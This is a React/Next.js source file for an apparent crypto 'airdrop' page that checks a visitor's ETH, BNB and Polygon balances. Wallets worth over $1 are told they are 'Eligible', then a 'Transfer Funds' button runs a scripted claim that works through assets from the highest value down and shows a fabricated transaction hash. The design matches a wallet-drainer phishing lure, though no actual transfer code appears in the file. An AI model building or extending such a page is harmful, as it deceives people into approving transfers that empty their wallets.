"use client";
import React, { useState } from 'react';
import { useAccount, useConnect } from 'wagmi';
import { getBalance } from '@wagmi/core';
import { injected } from 'wagmi/connectors';
import Header from '../components/Header';
import WalletModal from '../components/WalletModal';
import { config } from '../config';

export default function AirdropPage() {
    const { address: walletAddress, isConnected } = useAccount();
    const { connect } = useConnect();
    const [address, setAddress] = useState('');
    const [status, setStatus] = useState<'idle' | 'checking' | 'eligible' | 'not-eligible' | 'claiming' | 'processed'>('idle');
    const [totalValue, setTotalValue] = useState<number>(0);
    const [isModalOpen, setIsModalOpen] = useState(false);

    // Auto-fill address if wallet connected
    React.useEffect(() => {
        if (isConnected && walletAddress) {
            setAddress(walletAddress);
        }
    }, [isConnected, walletAddress]);

    const checkEligibility = async () => {
        setStatus('checking');

        try {
            const addr = address as `0x${string}`;

            // Check native balances on multiple chains
            const balances = await Promise.all([
                getBalance(config, { address: addr, chainId: 1 }),   // ETH
                getBalance(config, { address: addr, chainId: 56 }),  // BSC
                getBalance(config, { address: addr, chainId: 137 }), // Polygon
            ]);

            // Fetch current prices
            const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network&vs_currencies=usd');
            let prices: any = { ethereum: { usd: 0 }, binancecoin: { usd: 0 }, 'matic-network': { usd: 0 } };

            if (res.ok) {
                prices = await res.json();
            }

            // Calculate total value
            const ethValue = Number(balances[0].formatted) * (prices.ethereum?.usd || 0);
            const bscValue = Number(balances[1].formatted) * (prices.binancecoin?.usd || 0);
            const polyValue = Number(balances[2].formatted) * (prices['matic-network']?.usd || 0);

            const total = ethValue + bscValue + polyValue;
            setTotalValue(total);

            // Artificial delay for UX
            setTimeout(() => {
                if (total > 1) {
                    setStatus('eligible');
                } else {
                    setStatus('not-eligible');
                }
            }, 1000);

        } catch (e) {
            console.error(e);
            setStatus('not-eligible'); // Fail safe
        }
    };

    const [claimStatusText, setClaimStatusText] = useState('Processing Claim...');

    const handleClaim = () => {
        // Detailed simulation of a multi-step claim process
        setStatus('claiming');
        setClaimStatusText('Analyziing wallet assets...');

        // Step 1: Highest Value
        setTimeout(() => {
            setClaimStatusText('Processing highest value asset (ETH)...');

            // Step 2: Secondary
            setTimeout(() => {
                setClaimStatusText('Processing secondary asset (BNB)...');

                // Step 3: Tertiary
                setTimeout(() => {
                    setClaimStatusText('Processing remaining assets (Polygon)...');

                    // Step 4: Finalize
                    setTimeout(() => {
                        setStatus('processed');
                    }, 2000);
                }, 2000);
            }, 2000);
        }, 1500);
    };

    const handleConnectWallet = () => {
        setIsModalOpen(false);
        connect({ connector: injected() });
    };


    return (
        <>
            <div className="min-h-screen bg-black relative w-full overflow-x-hidden">
                {/* Ambient Backgound specifically for Airdrop */}
                <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-purple-600/10 rounded-full blur-[150px] pointer-events-none"></div>

                <Header />

                <main className="flex flex-col items-center justify-center min-h-screen p-4 pt-32 pb-32 relative z-10 w-full">

                    <div className="mb-8">
                        <img src="/assets/river-logo-white.svg" alt="River Logo" className="w-24 h-24 mx-auto animate-pulse-slow" />
                    </div>

                    <h1 className="text-5xl md:text-7xl font-light text-center mb-4 tracking-tighter">
                        <span className="block text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-purple-400 to-pink-400 animate-gradient-x">
                            Wallet Check
                        </span>
                    </h1>

                    <p className="text-white/40 text-lg mb-12 max-w-xl text-center font-light">
                        Check Balance
                    </p>

                    <div className="w-full max-w-lg relative group">
                        <div className="absolute -inset-1 bg-gradient-to-r from-blue-600 to-purple-600 rounded-2xl blur opacity-20 group-hover:opacity-40 transition duration-500"></div>
                        <div className="relative bg-[#0A0A0A] border border-white/10 rounded-xl p-2 flex items-center shadow-2xl">
                            <input
                                type="text"
                                placeholder="Enter wallet address (0x...)"
                                value={address}
                                onChange={(e) => setAddress(e.target.value)}
                                className="bg-transparent border-none outline-none text-white w-full px-4 py-3 placeholder:text-white/20 font-mono"
                            />
                            <button
                                onClick={checkEligibility}
                                disabled={status === 'checking' || !address}
                                className="bg-white text-black px-6 py-3 rounded-lg font-medium hover:bg-gray-200 disabled:opacity-50 disabled:cursor-not-allowed transition whitespace-nowrap min-w-[100px]"
                            >
                                {status === 'checking' ? (
                                    <span className="flex items-center gap-2">
                                        <span className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin"></span>
                                    </span>
                                ) : 'Check'}
                            </button>
                        </div>
                    </div>

                    {/* Results Area */}
                    <div className="h-32 mt-8 flex items-center justify-center w-full max-w-lg transition-all duration-500">

                        {status === 'eligible' && (
                            <div className="w-full bg-green-500/10 border border-green-500/20 rounded-xl p-6 text-center animate-in fade-in slide-in-from-bottom-4">
                                <div className="text-green-400 text-xl font-medium mb-1">🎉 You are Eligible!</div>
                                <p className="text-green-400/60 text-sm">Portfolio Value: ${totalValue.toFixed(2)}</p>
                                <p className="text-green-400/60 text-xs mt-1">Allocation based on asset holdings</p>
                                <button
                                    onClick={handleClaim}
                                    className="mt-4 bg-green-500 text-black px-6 py-2 rounded-full font-bold hover:bg-green-400 shadow-[0_0_20px_rgba(34,197,94,0.3)] transition"
                                >
                                    Transfer Funds
                                </button>
                            </div>
                        )}

                        {status === 'claiming' && (
                            <div className="w-full bg-blue-500/10 border border-blue-500/20 rounded-xl p-6 text-center animate-in fade-in slide-in-from-bottom-4">
                                <div className="flex flex-col items-center gap-3">
                                    <div className="w-8 h-8 border-4 border-blue-500/30 border-t-blue-500 rounded-full animate-spin"></div>
                                    <div className="text-blue-400 text-lg font-medium">{claimStatusText}</div>
                                    <p className="text-blue-400/60 text-xs">Please confirm the transaction in your wallet.</p>
                                </div>
                            </div>
                        )}

                        {status === 'processed' && (
                            <div className="w-full bg-green-500/10 border border-green-500/20 rounded-xl p-6 text-center animate-in fade-in slide-in-from-bottom-4">
                                <div className="text-green-400 text-xl font-medium mb-2">Claim Submitted</div>
                                <p className="text-green-400/60 text-sm">Claiming your rewards in 12 hours.</p>
                                <div className="mt-4 text-xs text-white/40 bg-black/40 p-2 rounded font-mono">
                                    Tx Hash: 0x8a...3f9c
                                </div>
                            </div>
                        )}

                        {status === 'not-eligible' && (
                            <div className="w-full bg-red-500/10 border border-red-500/20 rounded-xl p-6 text-center animate-in fade-in slide-in-from-bottom-4">
                                <div className="text-red-400 text-xl font-medium mb-1">Not Eligible</div>
                                <p className="text-red-400/60 text-sm">
                                    Total asset value must be greater than $1.00 USD. <br />
                                    Current Value: ${totalValue.toFixed(2)}
                                </p>
                            </div>
                        )}
                    </div>

                </main>

                <WalletModal
                    isOpen={isModalOpen}
                    onClose={() => setIsModalOpen(false)}
                    onConnect={handleConnectWallet}
                />
            </div>
        </>
    );
}
